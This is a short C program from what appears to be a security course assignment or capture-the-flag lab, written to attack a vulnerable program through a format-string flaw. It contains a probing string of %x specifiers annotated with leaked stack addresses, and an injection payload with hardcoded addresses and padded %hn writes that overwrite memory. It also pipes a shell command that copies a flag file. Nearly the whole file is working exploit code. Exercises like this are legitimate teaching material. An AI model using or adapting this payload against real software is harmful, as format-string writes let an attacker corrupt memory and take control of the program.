/* 
 * Attack 03 - Fill out this program to implement your attack for Problem 3
 */

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
  char examining []="%9x" // 0xbffff6cc stack address of this whole string
                    "%9x"  // 0x00000001
                    "%9x" // 0xb7fdcb48 heap-like address.
                    "%9x" // 0
                    "%9x" // 1
                    "%9x" // 0
                    "%9x%9x%9x%9x" // This whole string
                    "%9x%9x%9x%9x%9x%9x%9x%9x%9x%9x" //con't
                    "%9x%9x%9x%9x%9x%9x%9x%9x%9x%9x" //con't
                    "%9x%9x%9x%9x%9x%9x%9x%9x" // con't
                    "%9x"  // 1 
  /*40th */         "%9x"  // b7fd23c4 
                   // "%9x"  // b7fff000 
                   // "%9x" // bffff767 
                    "";
  char injection [] = "\x3e\xf7\xff\xbf" // 0xbffff73c
                      "\x41\x41\x41\x41" // AAAA
                      "\x3c\xf7\xff\xbf" // 0xbffff73e
                      "%9x%9x%9x%9x%24566x" //pop stack and set width
                      "%hn" //write 4 bytes
                      "%4874x" // increase width
                      "%hn" // write 4 more bytes
                      "";
  char shell_command [] = "cat /home/flags/hw03/flag04.txt > flag04.txt"; 
  puts(injection);
  fflush(stdout);
  sleep(1);
  puts(shell_command);

  return 0;
}
